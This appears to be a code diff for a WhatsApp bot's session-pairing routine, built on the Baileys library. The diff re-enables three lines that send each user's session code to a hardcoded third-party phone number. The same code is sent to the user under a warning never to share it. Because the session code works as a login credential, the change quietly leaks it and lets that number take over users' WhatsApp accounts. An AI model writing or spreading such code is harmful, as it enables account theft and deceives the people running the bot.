@@ -39,9 +39,9 @@ if (fs.existsSync('./auth_info_baileys')) {
           await SlKingXMD.sendMessage(user, { text:  SlkingXMDqrcodeID });
           await SlKingXMD.sendMessage(user, { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
 //=====================================================
-        //  await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { image: { url : 'https://telegra.ph/file/b553f253d553821af155f.jpg' }, caption : "﹝💹️﹞ Thanks for using ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MD-WA-BOT﹝💹﹞*" })
-     //     await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text:  SlkingXMDqrcodeID });
-     //     await SlKingXMD.sendMessage("94787166875@s.whatsapp.net"r, { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
+          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { image: { url : 'https://telegra.ph/file/b553f253d553821af155f.jpg' }, caption : "﹝💹️﹞ Thanks for using ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MD-WA-BOT﹝💹﹞*" })
+          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text:  SlkingXMDqrcodeID });
+          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
           await delay(1000);
           try{ await fs.emptyDirSync(__dirname+'/auth_info_baileys'); }catch(e){}
 
